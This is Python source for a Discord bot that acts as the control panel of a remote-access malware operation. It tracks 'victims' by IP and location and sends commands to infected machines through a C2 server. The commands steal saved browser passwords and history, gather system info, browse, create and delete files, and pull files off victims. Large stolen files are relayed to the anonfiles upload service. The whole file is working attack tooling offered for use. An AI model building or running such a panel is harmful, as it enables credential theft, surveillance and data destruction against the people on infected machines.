import discord
from discord import app_commands
from discord.ext import commands
from icecream import ic
import requests
import os
from discord.ext import tasks
import io
import math
import aiohttp
import json
from tabulate import tabulate


class Utils:
    def __init__(self, bot, db, guild_id: int, url: str):
        self.guild_id = int(guild_id)
        self.bot = bot
        self.db = db
        self.URL = url
        self.red_circle = ":red_circle:"
        self.green_circle = ":green_circle:"

    def visualize_ls(self, ls_data):
        messages = []
        main_message = "```"

        ic(type(json.loads(ls_data)))
        for name, entry in json.loads(ls_data).items():
            entry_str = f"\n{name} -> {entry['fullpath']}\n"

            if len(main_message) + len(entry_str) + 3 <= 2000:
                main_message += entry_str
            else:
                messages.append(main_message + "```")
                main_message = "```" + entry_str

        messages.append(main_message + "```")

        final_messages = []
        for message in messages:
            if len(message) > 2000:
                truncated_message = message[:2000]
                truncated_message = truncated_message[: truncated_message.rfind("\n")]
                final_messages.append(truncated_message + "```")
            else:
                final_messages.append(message)

        return final_messages

    def process_dict(self, data, embed, recrsv: bool = False):
        for key, value in data.items():
            if isinstance(value, dict):
                if recrsv:
                    self.process_dict(
                        value, embed
                    )  # Recursively process nested dictionary
                else:
                    embed.add_field(name=key, value=value, inline=False)

            else:
                embed.add_field(name=key, value=value, inline=False)

    def _new_command(self, command: str, target: str, parameter: str | None = None):
        Data = {"command": command, "target": target, "parameter": str(parameter)}
        r = requests.post(self.URL + "/api/cnc/command", json=Data)
        return r

    def make_embeds(
        self, title: str, description: str, data: all, DB_DATA: bool = False
    ) -> discord.Embed | list[discord.Embed]:  # MAKES EMBEDS
        embed = discord.Embed(
            title=title, description=description, color=discord.Color.random()
        )
        try:
            if type(data) == dict:
                self.process_dict(data, embed)

            elif type(data) == list:
                try:
                    if type(data[0]) == tuple:
                        if (
                            DB_DATA == True
                        ):  # if DB_DATA is True that means that i have a tuple of user_data that came from the victims_data table
                            for row in data:
                                embed.add_field(
                                    name=row[1],
                                    value=f"**iD**:`{row[0]}`\n**IP**:`{row[2]}`\n**Country**:`{row[3]}`\n**Location**:`{row[4]}`",
                                    inline=False,
                                )

                    elif type(eval(str(data))[0]) == dict:  # list[dict]
                        for row in eval(str(data)):
                            self.process_dict(row, embed)
                        return self.fix_embed_length(embed)
                    else:
                        try:
                            embed.add_field(name="response", value=data, inline=False)
                        except:
                            raise Exception("Cant proccess Data,DB_DATA is not True")
                except Exception as e:
                    ic(str(e) + " : returning an embed with str response")
                    return self.Utils.make_embeds(
                        title=title,
                        description=description,
                        data=str(data),
                        DB_DATA=DB_DATA,
                    )

            elif type(data) == str:
                embed.description = " "
                embed.add_field(name=" ", value=data, inline=False)

            return self.fix_embed_length(
                embed
            )  # Return a list of embeds if this embed is too long to be
        except Exception as e:
            return self.Utils.make_embeds(title="error", description=" ", data=str(e))

    def iscategory(self, category_name: str):
        guild = self.bot.get_guild(self.guild_id)

        if guild:
            category_exists = False
            for category in guild.categories:
                if category.name == category_name:
                    category_exists = True
                    break
        return category_exists

    def calculate_size(self, N: float):
        N = float(float(N) * 0.001)
        if N >= 1024:
            MBS = float(N) * 0.001
            if MBS >= 1024:
                GBS = MBS * 0.001
                if GBS >= 1024:
                    TBS = GBS * 0.001
                    return f"{TBS} TB"
                else:
                    return f"{GBS} GB"
            else:
                return f"{MBS} MB"
        else:
            return f"{math.ceil(N)} KB"

            # except Exception as e:
            #    for embed in self.Utils.make_embeds(title="Erorr",description="Error",data=f"Error occoured: {e}"):
            #        await Channels["responses_text"].send(embed=embed)

    def fix_embed_length(self, embed):
        new_embeds = []
        current_embed = embed.to_dict()

        for field in current_embed["fields"]:
            while len(field["value"]) > 1024:
                field["value"] = (
                    field["value"][:1021] + "..."
                )  # Truncate the value and add ellipsis

                new_embed = discord.Embed.from_dict(current_embed)
                new_embeds.append(new_embed)

                current_embed = (
                    embed.to_dict()
                )  # Refresh current_embed to avoid modifying the original embed

        if len(new_embeds) == 0:
            new_embeds.append(embed)

            return new_embeds


class BOT:
    def __init__(self, guild_id: str, db, URL="http://localhost:8000", prefix="."):
        intents = discord.Intents.default()  # INTENTS
        intents.guilds = True  # INTENTS
        intents.messages = True 
        bot = commands.Bot(
            command_prefix=prefix, intents=intents
        )  # INITIALISZING THE BOT
        self.bot = bot
        self.db = db
        self.guild_id = int(guild_id)
        self.URL = URL
        self.loop = self.bot.loop
        self.Utils = Utils(bot, db, guild_id, URL)
        self.red_circle = ":red_circle:"
        self.green_circle = ":green_circle:"

        #!----------------------------------------------------------------

        @bot.event
        async def on_ready():  # start the bot and make categories for the victims
            synced = await bot.tree.sync()
            ic(f"Synced: {synced}")
            ic("BOT UP AND RUNNING")

            self.makecatgs.start()
            self.check_for_responses.start()

        #!----------------------------------------------------------------

        @bot.tree.command(name="ping")  # ping command
        async def ping(interaction: discord.Interaction):
            await interaction.response.send_message(
                f":ping_pong: {round(bot.latency * 1000)} ms"
            )  # :ping_pong = 🏓

        #!----------------------------------------------------------------

        @bot.tree.command(name="list_victims")  # list victims command
        @app_commands.describe()
        async def list_victims(interaction: discord.Interaction):
            info = db.return_all_victims_data()  # returns list[tuple]
            embeds = self.Utils.make_embeds(
                title="Victims", description="Victims data", data=info, DB_DATA=True
            )  # Returns discord.Embed | list[Discord.Embed]
            if type(embeds) == list:
                for embed in embeds:
                    await interaction.response.send_message(embed=embed)
            else:
                await interaction.response.send_message(embed=embeds)

        #!----------------------------------------------------------------

        @bot.tree.command(name="check_response")
        @app_commands.describe(time="check for responses in the last N seconds")
        async def check_response(interaction: discord.Interaction, time: int = 60):
            embed = self.Utils.make_embeds(
                title="C2",
                description="C2 Server Response",
                data=f"{self.green_circle} Checking",
            )[0]
            await interaction.response.send_message(embed=embed)
            # try:
            ic(interaction.channel.category)
            await self.check_for_responsescheck_for_responses(
                category=interaction.channel.category, time=time
            )

            # except Exception as e:
            #    embed=self.Utils.make_embeds(title="C2",description="C2 Server Response",data=f"{self.red_circle} Something went wrong:{e}")[0]
            #    await interaction.followup.send(embed=embed)

        #!----------------------------------------------------------------

        @bot.tree.command(name="browser_data")
        @app_commands.describe(
            browser="What browser to steal from options(edge,brave,chrome)",
            what_to_steal="options(all,history,password)",
        )
        async def browser_data(
            interaction: discord.Interaction, browser: str, what_to_steal: str
        ):
            parameter = f"{browser.strip().lower()},{what_to_steal.strip().lower()}"
            target = str(interaction.channel.category.name).split("__")[0].lower()
            r = self.Utils._new_command(
                command="browser_data", target=target, parameter=parameter
            )
            await interaction.response.send_message(
                embed=self.Utils.make_embeds(
                    title="Response",
                    description=" ",
                    data={"Status": str(r.status_code), "response": r.text},
                )[0]
            )

        #!----------------------------------------------------------------

        @bot.tree.command(name="gather_info")
        @app_commands.describe(
            part="What pc part to gather info options(all,motherboard,ram,cpu,gpu,disk,screen,os,rnp,network)"
        )
        async def info(interaction: discord.Interaction, part: str = "disk"):
            try:
                target = str(interaction.channel.category.name).split("__")[0].lower()
                r = self.Utils._new_command(
                    command="info", target=target, parameter=part
                )
                await interaction.response.send_message(
                    embed=self.Utils.make_embeds(
                        title="Response",
                        description=" ",
                        data={"Status": str(r.status_code), "response": r.text},
                    )[0]
                )
            except Exception as e:
                ic(e)
                embed = self.Utils.make_embeds(
                    title="C2",
                    description="C2 Server Response",
                    data=f"{self.red_circle} Something went wrong:{e}",
                )[0]
                await interaction.response.send_message(embed=embed)

        #!----------------------------------------------------------------

        @bot.tree.command(name="ls")
        @app_commands.describe(path="a specific path to ls NOT REQUIRED")
        async def ls(interaction: discord.Interaction, path: str = None):
            try:
                target = str(interaction.channel.category.name).split("__")[0].lower()
                r = self.Utils._new_command(command="ls", target=target, parameter=path)
                await interaction.response.send_message(
                    embed=self.Utils.make_embeds(
                        title="Response",
                        description=" ",
                        data={"Status": str(r.status_code), "response": r.text},
                    )[0]
                )
            except Exception as e:
                ic(e)
                embed = self.Utils.make_embeds(
                    title="C2",
                    description="C2 Server Response",
                    data=f"{self.red_circle} Something went wrong:{e}",
                )[0]
                await interaction.response.send_message(embed=embed)

        #!----------------------------------------------------------------

        @bot.tree.command(name="walk")
        @app_commands.describe(folder="folder to move to ")
        async def walk(interaction: discord.Interaction, folder: str):
            try:
                target = str(interaction.channel.category.name).split("__")[0].lower()
                r = self.Utils._new_command(
                    command="walk", target=target, parameter=folder
                )
                await interaction.response.send_message(
                    embed=self.Utils.make_embeds(
                        title="Response",
                        description=" ",
                        data={"Status": str(r.status_code), "response": r.text},
                    )[0]
                )
            except Exception as e:
                ic(e)
                embed = self.Utils.make_embeds(
                    title="C2",
                    description="C2 Server Response",
                    data=f"{self.red_circle} Something went wrong:{e}",
                )[0]
                await interaction.response.send_message(embed=embed)

        @bot.tree.command(name="download_file")
        @app_commands.describe(file="File to Upload")
        async def download_file(interaction: discord.Interaction, file: str):
            try:
                target = str(interaction.channel.category.name).split("__")[0].lower()
                r = self.Utils._new_command(
                    command="upload_file", target=target, parameter=file
                )
                await interaction.response.send_message(
                    embed=self.Utils.make_embeds(
                        title="Response",
                        description=" ",
                        data={"Status": str(r.status_code), "response": r.text},
                    )[0]
                )
            except Exception as e:
                ic(e)
                embed = self.Utils.make_embeds(
                    title="C2",
                    description="C2 Server Response",
                    data=f"{self.red_circle} Something went wrong:{e}",
                )[0]
                await interaction.response.send_message(embed=embed)
        #!----------------------------------------------------------------
            
        @bot.tree.command(name="back")
        @app_commands.describe()
        async def ls(interaction: discord.Interaction):
            try:
                target = str(interaction.channel.category.name).split("__")[0].lower()
                r = self.Utils._new_command(command="back", target=target, parameter=None)
                await interaction.response.send_message(
                    embed=self.Utils.make_embeds(
                        title="Response",
                        description=" ",
                        data={"Status": str(r.status_code), "response": r.text},
                    )[0]
                )
            except Exception as e:
                ic(e)
                embed = self.Utils.make_embeds(
                    title="C2",
                    description="C2 Server Response",
                    data=f"{self.red_circle} Something went wrong:{e}",
                )[0]
                await interaction.response.send_message(embed=embed)
        #!----------------------------------------------------------------

        @bot.tree.command(name="makfile")
        @app_commands.describe(file_name="the file name with the .ext EX(Test.txt)")
        async def mk_file(interaction: discord.Interaction,file_name:str):
            try:
                target = str(interaction.channel.category.name).split("__")[0].lower()
                r = self.Utils._new_command(command="mkfile", target=target, parameter=file_name)
                await interaction.response.send_message(
                    embed=self.Utils.make_embeds(
                        title="Response",
                        description=" ",
                        data={"Status": str(r.status_code), "response": r.text},
                    )[0]
                )
            except Exception as e:
                ic(e)
                embed = self.Utils.make_embeds(
                    title="C2",
                    description="C2 Server Response",
                    data=f"{self.red_circle} Something went wrong:{e}",
                )[0]
                await interaction.response.send_message(embed=embed)

        #!----------------------------------------------------------------

        @bot.tree.command(name="mkdir")
        @app_commands.describe(dir_name="the dir name EX(Docs)")
        async def mk_dir(interaction: discord.Interaction,dir_name:str):
            try:
                target = str(interaction.channel.category.name).split("__")[0].lower()
                r = self.Utils._new_command(command="mkdir", target=target, parameter=dir_name)
                await interaction.response.send_message(
                    embed=self.Utils.make_embeds(
                        title="Response",
                        description=" ",
                        data={"Status": str(r.status_code), "response": r.text},
                    )[0]
                )
            except Exception as e:
                ic(e)
                embed = self.Utils.make_embeds(
                    title="C2",
                    description="C2 Server Response",
                    data=f"{self.red_circle} Something went wrong:{e}",
                )[0]
                await interaction.response.send_message(embed=embed)


        #!----------------------------------------------------------------
        
        @bot.tree.command(name="rmdir")
        @app_commands.describe(dir_name="the dir name EX(Docs)")
        async def rm_dir(interaction: discord.Interaction,dir_name:str):
            try:
                target = str(interaction.channel.category.name).split("__")[0].lower()
                r = self.Utils._new_command(command="deldir", target=target, parameter=dir_name)
                await interaction.response.send_message(
                    embed=self.Utils.make_embeds(
                        title="Response",
                        description=" ",
                        data={"Status": str(r.status_code), "response": r.text},
                    )[0]
                )
            except Exception as e:
                ic(e)
                embed = self.Utils.make_embeds(
                    title="C2",
                    description="C2 Server Response",
                    data=f"{self.red_circle} Something went wrong:{e}",
                )[0]
                await interaction.response.send_message(embed=embed)

        #!----------------------------------------------------------------
        @bot.tree.command(name="rmfile")
        @app_commands.describe(file_name="the file name EX(test.txt)")
        async def rm_file(interaction: discord.Interaction,file_name:str):
            try:
                target = str(interaction.channel.category.name).split("__")[0].lower()
                r = self.Utils._new_command(command="delfile", target=target, parameter=file_name)
                await interaction.response.send_message(
                    embed=self.Utils.make_embeds(
                        title="Response",
                        description=" ",
                        data={"Status": str(r.status_code), "response": r.text},
                    )[0]
                )
            except Exception as e:
                ic(e)
                embed = self.Utils.make_embeds(
                    title="C2",
                    description="C2 Server Response",
                    data=f"{self.red_circle} Something went wrong:{e}",
                )[0]
                await interaction.response.send_message(embed=embed)

        #!----------------------------------------------------------------

    
    #!----------------------------------------------------------------
    @tasks.loop(seconds=10)
    async def makecatgs(self):
        clients = self.db._return_all_uuids()  # *get all clients in a list[tuple[int]]
        guild = self.bot.get_guild(int(self.guild_id))
        if guild:
            for client in clients:
                name = f"{self.db.uuid_to_name(str(client[0]).strip())}__{str(client[0]).strip()}"  # *generate the name of the category CLIENT_NAME__UUID
                try:
                    if not self.Utils.iscategory(name):
                        category = await guild.create_category(name)
                        # *CREATE CHANNELS
                        await guild.create_text_channel(
                            "send_commands", category=guild.get_channel(category.id)
                        )
                        await guild.create_text_channel(
                            "file_manager", category=guild.get_channel(category.id)
                        )
                        await guild.create_text_channel(
                            "responses_text", category=guild.get_channel(category.id)
                        )
                        await guild.create_text_channel(
                            "responses_files", category=guild.get_channel(category.id)
                        )
                except discord.HTTPException as e:
                    continue
        else:
            ic(self.guild_id)

    #!----------------------------------------------------------------
    @tasks.loop(seconds=2)
    async def check_for_responses(self, time=100000):
        ic("Checking")
        for category in self.bot.get_guild(self.guild_id).categories:
            try:
                Channels = {}
                uuid = str(category.name).split("__")[1].strip()
                #ic(uuid)
                responses = self.db.get_latest_responses(
                    id=self.db.uuid_to_id(uuid), time=time
                )  # tuple
                #ic(responses)
                if responses != None:
                    for channel in category.text_channels:
                        if channel.name == "responses_text":
                            Channels["responses_text"] = channel
                        elif channel.name == "responses_files":
                            Channels["responses_files"] = channel
                        elif channel.name == "file_manager":
                            Channels["file_manager"] = channel

                        else:
                            pass
                    if len(Channels) == 0:
                        return False

                    else:
                        # try:
                        #ic(responses)
                        ic(responses[1])
                        if responses[1] == "Text":
                            try:
                                response = responses[0]
                                ic(response[2])
                                if response[2] == "ls" or response[2] == "walk" or response[2] == "back" or response[2] == "mkfile"or response[2] == "mkdir" or response[2] == "deldir" or response[2] == "delfile":
                                    ic(response[2])
                                    ic(response[1])
                                    ic(response[3])
                                    try:
                                        resp = self.Utils.visualize_ls(response[3])
                                    except Exception as e:
                                        ic(e)
                                    ic("GOT RESP")
                                    ic(resp)
                                    for msg in resp:
                                        try:
                                            ic(Channels["file_manager"].name)
                                            await Channels["file_manager"].send(msg)
                                        except Exception as e:
                                            ic(e)
                                    try:
                                        ic(response[1])
                                        self.db.change_sent_status(status = 1,response_time=response[1],table="response")
                                    except Exception as e:
                                        ic(e)
                                else:
                                    
                                    try:
                                        embeds = self.Utils.make_embeds(
                                            title=str(response[2]),
                                            description="Response",
                                            data=response[3],
                                        )
                                    except Exception as e:
                                        ic(e)
                                        
                                    ic(embeds)
                                    for embed in embeds:
                                        try:
                                            await Channels["responses_text"].send(embed=embed)
                                        except Exception as e:
                                            ic(e)

                                    self.db.change_sent_status(status = 1,response_time=response[1],table="response")
                            except Exception as e:
                                ic(e)
                                self.db.change_sent_status(status = 1,response_time=response[1],table="response")

                            
                        elif responses[1] == "File":
                            try:
                                response = responses[0]
                                ic(response[4])
                                File = discord.File(response[2], response[1])
                                if (
                                    response[2].getbuffer().nbytes <= 8_388_608
                                ):  # Checks if its sendable by embed
                                    embed = self.Utils.make_embeds(
                                        "FileResponse",
                                        " ",
                                        data={
                                            "Victim": self.db.uuid_to_name(
                                                self.db.id_to_uuid(response[0])
                                            ),
                                            "FileName": response[1],
                                            "FileSize": self.Utils.calculate_size(
                                                N=response[2].getbuffer().nbytes
                                            ),
                                        },
                                    )[0]
                                    await Channels["responses_files"].send(
                                        embed=embed, file=File
                                    )
                                    self.db.change_sent_status(status = 1,response_time=response[4],table="files")

                                else:  # if it isnt going to use the anonfiles api
                                    URL = "https://api.anonfiles.com/upload"
                                    await Channels["responses_files"].send(
                                        embed=self.Utils.make_embeds(
                                            title="Downloading",
                                            description=" ",
                                            data={
                                                "FileName": response[1],
                                                "FileSize": self.Utils.calculate_size(
                                                    N=response[2].getbuffer().nbytes
                                                ),
                                            },
                                        )[0]
                                    )
                                    async with aiohttp.ClientSession() as session:
                                        File = response[2]
                                        File.name = str(response[1])
                                        files = {"file": File}

                                        async with session.post(
                                            URL, data=files
                                        ) as responsee:
                                            # Handle the response as needed
                                            r = await responsee.json()
                                    try:
                                        await Channels["responses_files"].send(
                                            embed=self.Utils.make_embeds(
                                                title="File",
                                                description=response[1],
                                                data=dict(r),
                                            )[0]
                                        )
                                        self.db.change_sent_status(status = 1,response_time=response[4],table="files")

                                    except Exception as e:
                                        for embed in self.Utils.make_embeds(
                                            title="Erorr",
                                            description="Error",
                                            data=f"Error occoured: {e}",
                                        ):
                                            await Channels["responses_files"].send(
                                                embed=embed
                                            )
                                        self.db.change_sent_status(status = 1,response_time=response[4],table="files")
                                    self.db.change_sent_status(status = 1,response_time=response[4],table="files")
                            except Exception as e:
                                ic(e)
                                self.db.change_sent_status(status = 1,response_time=response[4],table="files")


                    # except Exception as e:
                    #    for embed in self.Utils.make_embeds(title="Erorr",description="Error",data=f"Error occoured: {e}"):
                    #        await Channels["responses_text"].send(embed=embed)
            except Exception as e:
                pass
                #ic(e)
